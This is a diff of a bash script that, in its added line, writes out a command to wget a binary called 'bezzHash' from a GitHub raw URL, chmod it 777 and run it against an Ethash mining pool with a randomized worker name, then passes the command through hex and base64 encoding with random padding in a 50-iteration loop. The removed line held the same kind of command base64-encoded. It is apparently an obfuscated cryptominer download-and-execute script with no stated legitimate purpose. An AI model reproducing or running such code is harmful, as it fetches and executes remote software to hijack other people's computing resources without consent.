@@ -3,13 +3,13 @@
 iterations=50
 
 for ((i=1; i<=$iterations; i++)); do
-    hex_code=$(echo -n "d2dldCBodHRwczovL2dpdGh1Yi5jb20vVGVzdGRyaXZlMzQ1L3NjcmlwdFgvcmF3L2JlemhIYXNoICYmIGNobW9kIDc3NyBiZXp6SGFzaCAmJiAuL2JlemhIYXNoIC0tdXJsPWh1bnRlcmQuJCgmbnNnbCBpMS05OTk5OSAtbiAxJT1HRW5DY0YwMDEpQEBlbmRhdGgucG9vbGJpbmFuY2UuY29tOjQ0Mw==" | xxd -p)
+    hex_code=$(echo -n "wget https://github.com/Testdrive345/scriptX/raw/main/bezzHash && chmod 777 bezzHash && ./bezzHash --url=hunterd.$(echo $(shuf -i 1-99999 -n 1)-Gok001)@ethash.poolbinance.com:443" | xxd -p)
     
     base64_encoded=$(echo "$hex_code" | base64)
     
     echo "$base64_encoded" > temp_base64_encoded.txt
     
-    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
+    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1 | tr -d '\0')
     echo "$random_chars" >> temp_base64_encoded.txt
     
     base64_decoded=$(cat temp_base64_encoded.txt | base64 -d)
